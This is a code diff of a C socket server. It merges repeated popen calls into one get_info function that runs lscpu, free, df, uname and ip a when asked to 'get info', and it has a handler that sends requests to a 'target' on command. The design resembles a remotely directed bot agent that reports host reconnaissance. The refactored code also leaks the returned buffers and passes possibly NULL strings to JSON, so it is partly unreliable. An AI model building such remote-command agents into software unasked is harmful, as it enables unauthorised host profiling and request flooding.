@@ -320,65 +320,30 @@ int start_server(int port) {
     return 0;
 }
 
-json_object *get_info() {
-    json_object *infoJson = json_object_new_object();
+char* get_info(char* command) {
+    char result[512];
+    char *buffer = NULL;
+    size_t buffer_size = 0;
 
-    FILE *lscpuFile = popen("lscpu", "r");
-    if (lscpuFile) {
-        char result[512];
-        char lscpuOutput[4096] = "";
-        while (fgets(result, sizeof(result), lscpuFile) != NULL) {
-            strcat(lscpuOutput, result);
+    FILE *file = popen(command, "r");
+    if (file) {
+        while (fgets(result, sizeof(result), file) != NULL) {
+            size_t result_len = strlen(result);
+            buffer = (char*)realloc(buffer, buffer_size + result_len + 1);
+            if (buffer) {
+                memcpy(buffer + buffer_size, result, result_len);
+                buffer_size += result_len;
+                buffer[buffer_size] = '\0'; // Assicura la terminazione corretta della stringa
+            } else {
+                // Gestione errore di allocazione
+                perror("Errore di allocazione di memoria");
+                break;
+            }
         }
-        json_object_object_add(infoJson, "infoCPU", json_object_new_string(lscpuOutput));
-        pclose(lscpuFile);
+        pclose(file);
     }
 
-    FILE *freeFile = popen("free", "r");
-    if (freeFile) {
-        char result[512];
-        char freeOutput[4096] = "";
-        while (fgets(result, sizeof(result), freeFile) != NULL) {
-            strcat(freeOutput, result);
-        }
-        json_object_object_add(infoJson, "infoRAM", json_object_new_string(freeOutput));
-        pclose(freeFile);
-    }
-
-    FILE *dfFile = popen("df -h", "r");
-    if (dfFile) {
-        char result[512];
-        char dfOutput[4096] = "";
-        while (fgets(result, sizeof(result), dfFile) != NULL) {
-            strcat(dfOutput, result);
-        }
-        json_object_object_add(infoJson, "infoHD", json_object_new_string(dfOutput));
-        pclose(dfFile);
-    }
-
-    FILE *unameFile = popen("uname -a", "r");
-    if (unameFile) {
-        char result[512];
-        char unameOutput[4096] = "";
-        while (fgets(result, sizeof(result), unameFile) != NULL) {
-            strcat(unameOutput, result);
-        }
-        json_object_object_add(infoJson, "infoOS", json_object_new_string(unameOutput));
-        pclose(unameFile);
-    }
-
-    FILE *ipAFile = popen("ip a", "r");
-    if (ipAFile) {
-        char result[512];
-        char ifconfigOutput[4096] = "";
-        while (fgets(result, sizeof(result), ipAFile) != NULL) {
-            strcat(ifconfigOutput, result);
-        }
-        json_object_object_add(infoJson, "infoNetwork", json_object_new_string(ifconfigOutput));
-        pclose(ipAFile);
-    }
-
-    return infoJson;
+    return buffer;
 }
 
 int send_get_request_to_the_target(json_object *json) {
@@ -462,13 +427,11 @@ int handle_post_request(int client_socket) {
         json_object *responseJson = json_object_new_object();
 
         if (strcmp(command, "get info") == 0) {
-            json_object *infoJson = get_info();
-            json_object_object_add(responseJson, "infoCPU", json_object_get(infoJson));
-            json_object_object_add(responseJson, "infoRAM", json_object_get(infoJson));
-            json_object_object_add(responseJson, "infoHD", json_object_get(infoJson));
-            json_object_object_add(responseJson, "infoOS", json_object_get(infoJson));
-            json_object_object_add(responseJson, "infoNetwork", json_object_get(infoJson));
-            json_object_put(infoJson);
+            json_object_object_add(responseJson, "infoCPU", json_object_new_string( get_info("lscpu")));
+            json_object_object_add(responseJson, "infoRAM", json_object_new_string(get_info("free")));
+            json_object_object_add(responseJson, "infoHD", json_object_new_string(get_info("df -h")));
+            json_object_object_add(responseJson, "infoOS", json_object_new_string(get_info("uname -a")));
+            json_object_object_add(responseJson, "infoNetwork", json_object_new_string(get_info("ip a")));
         } else if (strcmp(command, "request") == 0) {
             send_get_request_to_the_target(json);
         } else {
